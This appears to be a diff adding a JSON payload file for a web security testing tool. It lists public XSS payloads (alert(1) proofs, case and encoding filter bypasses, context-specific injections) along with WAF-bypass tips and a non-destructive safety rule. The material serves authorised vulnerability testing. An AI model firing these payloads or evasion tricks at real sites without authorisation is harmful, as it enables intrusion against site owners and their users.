@@ -1,0 +1,97 @@
+{
+  "metadata": {
+    "source": "Public XSS payloads, OWASP XSS Filter Evasion Cheat Sheet (public domain knowledge)",
+    "license": "Public Domain + CC BY-SA 4.0",
+    "date": "2026-09-18",
+    "category": "payloads",
+    "confidence": "high",
+    "provenance": "Public knowledge payloads, common XSS payloads known to security community, not private",
+    "version": "1.0",
+    "applicable_technologies": ["web"],
+    "references": [
+      "https://owasp.org/www-community/xss-filter-evasion-cheatsheet",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+    ]
+  },
+  "vuln_class": "xss",
+  "payloads": [
+    {
+      "type": "witness",
+      "description": "Minimal proof, not destructive",
+      "payloads": [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "\"><script>alert(1)</script>",
+        "';alert(1)//"
+      ],
+      "usage": "Test if payload reflected unescaped or executed, minimal proof"
+    },
+    {
+      "type": "bypass_case",
+      "description": "Case variation bypass",
+      "payloads": [
+        "<ScRiPt>alert(1)</ScRiPt>",
+        "<IMG SRC=x ONERROR=alert(1)>",
+        "<SvG OnLoAd=alert(1)>"
+      ],
+      "usage": "Bypass case-sensitive filters"
+    },
+    {
+      "type": "bypass_encoding",
+      "description": "Encoding bypass",
+      "payloads": [
+        "%3Cscript%3Ealert(1)%3C/script%3E",
+        "&lt;script&gt;alert(1)&lt;/script&gt;",
+        "<script\\x20>alert(1)</script>",
+        "<script\\x09>alert(1)</script>"
+      ],
+      "usage": "Bypass encoding filters"
+    },
+    {
+      "type": "context_html",
+      "description": "HTML context",
+      "payloads": [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>"
+      ]
+    },
+    {
+      "type": "context_attribute",
+      "description": "Attribute context",
+      "payloads": [
+        "\"><img src=x onerror=alert(1)>",
+        "'><img src=x onerror=alert(1)>",
+        "\" onfocus=alert(1) autofocus=\""
+      ]
+    },
+    {
+      "type": "context_javascript",
+      "description": "JavaScript context",
+      "payloads": [
+        "';alert(1)//",
+        "\";alert(1)//",
+        "'-alert(1)-'",
+        "</script><script>alert(1)</script>"
+      ]
+    },
+    {
+      "type": "context_url",
+      "description": "URL context",
+      "payloads": [
+        "javascript:alert(1)",
+        "JaVaScRiPt:alert(1)",
+        "data:text/html,<script>alert(1)</script>"
+      ]
+    }
+  ],
+  "waf_bypass": [
+    "Try case variation",
+    "Try encoding (URL, HTML, hex)",
+    "Try different tags (svg, img, iframe, body)",
+    "Try event handlers (onerror, onload, onfocus, onclick)",
+    "Check if CSP blocks, may need CSP bypass or report as low severity"
+  ],
+  "evidence_collection": "Request with payload, response showing payload unescaped or executed, screenshot if browser, tool output (curl)",
+  "safety": "Witness payloads only, minimal proof, not destructive, no stealing cookies beyond proof, no defacement"
+}
